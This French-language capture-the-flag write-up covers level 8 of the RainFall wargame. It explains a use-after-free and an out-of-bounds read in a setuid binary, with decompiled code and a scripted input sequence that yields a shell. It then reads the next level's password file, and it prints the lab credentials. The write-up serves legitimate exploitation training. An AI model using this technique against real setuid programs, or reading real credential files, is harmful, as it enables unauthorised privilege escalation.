## Connexion et exploration

```bash
ssh level8@192.168.1.150 -p 4243
```
> Le mot de passe est : `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

Une fois connecté, cet écran s'affiche : 
```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

informations sur le binaire a exploiter :
```bash
level8@RainFall:~$ ls -l level8
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
level8@RainFall:~$ file level8
level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
```

L'execution :
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
```
> affiche un message, attends un input, renvoi le meme output, fermeture via Ctrl+C ou Ctrl+D

Si on teste avec un input plus grand, il affiche plusieurs lignes :
```
(nil), (nil)
(nil), (nil)
(nil), (nil)
```

Analysons le binaire `objdump -R level8` 
```bash
level8:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a28 R_386_GLOB_DAT    __gmon_start__
08049a80 R_386_COPY        stdin
08049aa0 R_386_COPY        stdout
08049a38 R_386_JUMP_SLOT   printf
08049a3c R_386_JUMP_SLOT   free
08049a40 R_386_JUMP_SLOT   strdup
08049a44 R_386_JUMP_SLOT   fgets
08049a48 R_386_JUMP_SLOT   fwrite
08049a4c R_386_JUMP_SLOT   strcpy
08049a50 R_386_JUMP_SLOT   malloc
08049a54 R_386_JUMP_SLOT   system
08049a58 R_386_JUMP_SLOT   __gmon_start__
08049a5c R_386_JUMP_SLOT   __libc_start_main
```
[Resultat du objdump -d level8](./source/objdump.txt)  
[Resultat de la decompilation](./source/level8.c) avec [HexRays sur DogBolt](https://dogbolt.org/)

Tiens tiens, on arrive a declencher des output differents si on rentre les input qui apparaissent en dur dans le code reconstruit :
```c
  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
```

On peut voir que le programme attend des commandes :
- `auth ` : alloue 4 octets pour stocker le mot de passe, puis copie le mot de passe dans cette zone mémoire si la taille est inférieure ou égale à 30 octets.
- `reset` : libère la mémoire allouée pour le mot de passe.
- `service` : duplique le nom du service et le stocke dans une variable.
- `login` : vérifie si le neuvième entier (32 bits) dans la zone mémoire du mot de passe est non nul. Si c'est le cas, il exécute une shell (/bin/sh). Sinon, il affiche "Password:\n".

Voyons ca en pratique :
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAAA
0x804a008, (nil)
service BBBBB
0x804a008, 0x804a018
reset
0x804a008, 0x804a018
auth CCCCC
0x804a008, 0x804a018
service DDDDD
0x804a008, 0x804a028
reset
0x804a008, 0x804a028
auth EEEEE
0x804a008, 0x804a028
service DDDDD
0x804a008, 0x804a038
reset
0x804a008, 0x804a038
auth FFFFF
0x804a008, 0x804a038
service GGGGG
0x804a008, 0x804a048
reset
0x804a008, 0x804a048
auth HHHHH
0x804a008, 0x804a048
service IIIII
0x804a008, 0x804a058
reset
0x804a008, 0x804a058
auth JJJJJ
0x804a008, 0x804a058
service KKKKK
0x804a008, 0x804a068
reset
0x804a008, 0x804a068
auth LLLLL
0x804a008, 0x804a068
service MMMMM
0x804a008, 0x804a078
reset
0x804a008, 0x804a078
login
$ cd /home/user/level9
$ whoami
level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

wtf, petite anecdote, j'ai juste tenté plein de fois le cycle de commandes `auth`, `service`, `reset` avec des valeurs quelconques, et ca a marché du tout 1er coup ^^  
En creusant un peu, voici le concept que j'ai compris :  

Le comportement du programme repose sur trois mécanismes dangereux combinés ensemble :  
- un pointeur *dangling*  
- la réutilisation du tas (heap)  
- la lecture hors limites dans `login`  

#### 1. `auth` crée un pointeur vers un bloc très petit puis `reset` le libère sans le remettre à `NULL`  
Lorsque l’on tape :
```
auth XXXX
reset
```

Le programme effectue :  
- `auth = malloc(4)` → un petit bloc est alloué  
- `free(auth)` → le bloc est libéré  
- **mais `auth` continue de pointer dessus**, ce qui en fait un *dangling pointer*.

Ce bloc libéré devient disponible pour les futures allocations du tas (`malloc`, `strdup`, etc.)  

#### 2. `service` alloue régulièrement de nouveaux blocs juste après celui pointé par `auth`
Chaque commande `service XYZ` effectue un `strdup`, donc un `malloc`.  
On observe les adresses :  
```
auth = 0x804a008
service = 0x804a018
service = 0x804a028
service = 0x804a038
[...]
```

On voit clairement que le tas se remplit de blocs successifs **immédiatement après** l’ancien bloc de `auth`  
Et comme `auth` pointe encore sur son ancien bloc libéré, **la mémoire juste après `auth` se retrouve modifiée par d’autres allocations**  

#### 3. Le test crucial dans `login` lit 32 octets plus loin que la zone allouée

Dans `login`, on trouve :
```c
if (*((int *)auth + 8))
    system("/bin/sh");
```

`*((int*)auth + 8)` = lecture de l’entier placé à l’adresse :
```
auth + 8 * 4 = auth + 32 octets
```

Mais `auth` ne fait que 4 octets.  
Le test lit donc **de la mémoire voisine**, appartenant aux blocs `service` ou aux métadonnées du tas.  
Si cette valeur est non nulle → **shell root (level9)**.

#### 4. En répétant `auth → service → reset`, on finit par obtenir une valeur non nulle

À chaque itération, le tas se réorganise différemment.  
De nouveaux blocs sont placés après l’adresse fantôme de `auth`, jusqu’à ce que par hasard :
```
*(auth + 32) != 0
```

Cela peut être :
- un pointeur,
- une taille d’allocation,
- un morceau d’une structure interne,
- ou tout autre donnée non nulle.

Dès que la lecture hors limites tombe sur une valeur ≠ 0 → la condition est vraie, et `system("/bin/sh")` s’exécute.

Du coup on a pu récupérer le mot de passe du level9 : `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

<br>

## Pour reproduire l'attaque

1. Connexion en ssh au niveau 8
```bash
ssh level8@192.168.1.150 -p 4243
# mot de passe est : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

2. Lancer la commande d'exploit (cette fois ci avec la cmd python)
```bash
( python - << 'EOF'
print("auth AAAAA")
print("service BBBBB")
print("reset")
print("auth CCCCC")
print("service DDDDD")
print("reset")
print("auth EEEEE")
print("service DDDDD")
print("reset")
print("auth FFFFF")
print("service GGGGG")
print("reset")
print("auth HHHHH")
print("service IIIII")
print("reset")
print("auth JJJJJ")
print("service KKKKK")
print("reset")
print("auth LLLLL")
print("service MMMMM")
print("reset")
print("login")
EOF
cat ) | ./level8
```

3. Une fois la shell obtenue, aller dans le dossier level9 et lire le mot de passe
```bash
cd /home/user/level9
whoami
cat .pass
# resultat : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
